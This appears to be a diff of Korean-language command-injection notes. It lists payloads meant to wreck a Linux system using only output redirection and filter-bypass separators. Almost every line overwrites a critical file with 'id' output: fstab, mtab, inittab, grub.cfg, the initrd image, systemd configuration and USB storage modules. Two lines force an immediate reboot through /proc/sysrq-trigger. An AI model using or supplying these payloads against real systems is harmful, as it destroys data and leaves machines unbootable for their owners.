@@ -11,23 +11,14 @@ and, or ,; 우회
 라다이렉션만을 이용하여 시스템 파괴  
 
 id>/lib/modules/*/kernel/drivers/usb/storage  
-
 id>/etc/fstab  
-
 id>/etc/mtab  
-
 id>/etc/inittab  
-
 id>/boot/grub/grub.cfg  
-
 id>/boot/initrd.img-$(uname -r)  
-
 id>/etc/systemd/  
-
 echo 'b'>/proc/sysrq-trigger  
-
 <<<b>/proc/sysrq-trigger  
-
 root일 경우만 덮어씌울수있음.  
 
 --------------------------------------------  
